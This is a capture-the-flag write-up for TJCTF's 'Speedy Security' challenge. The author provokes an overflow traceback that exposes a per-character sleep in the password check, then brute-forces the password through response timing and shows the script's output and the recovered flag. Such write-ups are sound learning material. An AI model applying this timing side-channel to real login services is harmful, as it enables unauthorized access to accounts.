# Speedy Security
Miscellaneous - 40 points

## Challenge 

Written by nthistle

I hear there's a flag hiding behind this new service, Speedy Security(TM). Can you find it?

	nc problem1.tjctf.org 8003

## Solution

	$ nc problem1.tjctf.org 8003
	Welcome to Speedy Security(TM), where we'll check your password as much as you like, for added security!
	How many times would you like us to check each character of your password?
	10
	Please enter your password:
	hi
	Authorization failed!

From the description, it seems to be a simple timing attack.

By increasing the number of times the character is checked, a noticable delay will be seen.

---

Now I'll try some huge value for the delay

	$ nc problem1.tjctf.org 8003
	Welcome to Speedy Security(TM), where we'll check your password as much as you like, for added security!
	How many times would you like us to check each character of your password?
	999999999999999999999999999999999
	Please enter your password:
	tj
	If you insist...
	Traceback (most recent call last):
	  File "/home/app/problem.py", line 40, in <module>
	    main()
	  File "/home/app/problem.py", line 31, in main
	    if check(s, PASSWORD + "_", n):
	  File "/home/app/problem.py", line 9, in check
	    time.sleep(n/5000000)   # ;)
	OverflowError: timestamp too large to convert to C _PyTime_t

From this, we can see that for every correct character of the password, it sleeps `n/5000000` seconds.

We can sleep 1 second per correct character by entering `5000000`.

---

Similar to [EasyCTF 2018 Flag Time](https://github.com/zst123/easyctf_iv-2018-writeups/tree/master/Solved/Flag_Time), we can bruteforce for the correct character by checking for the entry with the maximum time.

	$ python3 solve.py 
	Starting bruteforce
	2 T
	3 Tk
	4 TkV
	5 TkVW
	6 TkVWM
	7 TkVWM3
	8 TkVWM3I
	9 TkVWM3Ig
	10 TkVWM3IgZ
	11 TkVWM3IgZ2
	12 TkVWM3IgZ29
	13 TkVWM3IgZ29O
	14 TkVWM3IgZ29OT

However, after 15 seconds, it seems like the server always disconnects me. I had to modify to do a shorter time per character, and round the elapsed time to 1 decimal place.

I had to restart a few times, continuing off from the last value prepended. Because the server keeps disconnecting me...

After many tries, I got all the results pieced together using 0.25 sec/char.

	Speedy_Security $ python3 solve.py 
	Starting bruteforce
	0.7 T
	1.0 Tk
	1.2 TkV
	1.5 TkVW
	1.7 TkVWM
	2.0 TkVWM3
	2.2 TkVWM3I
	2.5 TkVWM3Ig
	2.7 TkVWM3IgZ
	3.0 TkVWM3IgZ2
	3.2 TkVWM3IgZ29
	3.5 TkVWM3IgZ29O
	3.7 TkVWM3IgZ29OT
	4.0 TkVWM3IgZ29OTj
	4.2 TkVWM3IgZ29OTjQ
	4.5 TkVWM3IgZ29OTjQg
	5.0 TkVWM3IgZ29OTjQgR
	5.0 TkVWM3IgZ29OTjQgRz
	5.2 TkVWM3IgZ29OTjQgRzF
	5.5 TkVWM3IgZ29OTjQgRzF2
	5.8 TkVWM3IgZ29OTjQgRzF2M
	6.0 TkVWM3IgZ29OTjQgRzF2My
	6.2 TkVWM3IgZ29OTjQgRzF2MyB
	6.5 TkVWM3IgZ29OTjQgRzF2MyB5
	6.7 TkVWM3IgZ29OTjQgRzF2MyB5M
	7.0 TkVWM3IgZ29OTjQgRzF2MyB5MH
	7.2 TkVWM3IgZ29OTjQgRzF2MyB5MHU
	7.5 TkVWM3IgZ29OTjQgRzF2MyB5MHUg
	7.8 TkVWM3IgZ29OTjQgRzF2MyB5MHUgd
	8.1 TkVWM3IgZ29OTjQgRzF2MyB5MHUgdV
	8.2 TkVWM3IgZ29OTjQgRzF2MyB5MHUgdVA
	8.5 TkVWM3IgZ29OTjQgRzF2MyB5MHUgdVAK
	Received: Successfully authorized.
	Welcome back, [[ EVAN ]]
	Your flag is  tjctf{char_chks_c4n_b3_SLOW}

## Flag

	tjctf{char_chks_c4n_b3_SLOW}
